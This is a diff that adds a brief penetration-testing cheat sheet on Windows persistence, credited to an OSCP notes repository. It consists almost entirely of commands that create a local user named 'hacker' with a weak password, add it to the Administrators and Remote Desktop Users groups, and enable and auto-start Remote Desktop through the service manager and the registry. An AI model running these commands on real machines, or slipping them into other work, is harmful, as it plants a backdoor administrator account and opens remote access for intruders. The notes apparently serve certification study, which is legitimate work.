@@ -1,0 +1,23 @@
+FULL CREDIT: https://github.com/s0wr0b1ndef/OSCP-note/blob/master/persistence/persistence_windows.txt
+I TAKE NO CREDIT!
+
+# Add Windows user:
+net user /add hacker 1234567
+
+# Add user to Administrators groups
+net localgroup administrators /add hacker
+
+# Add user to Remote Desktop user group
+net localgroup "Remote Desktop users" hacker /add
+
+# Start Remote Desktop service
+net start TermService
+
+# Is Remote Desktop Service running?
+tasklist /svc | findstr /C:TermService
+
+# Permanently enable Terminal Services
+sc config TermService start=auto
+
+# Enable Terminal services through registry  // reboot after
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
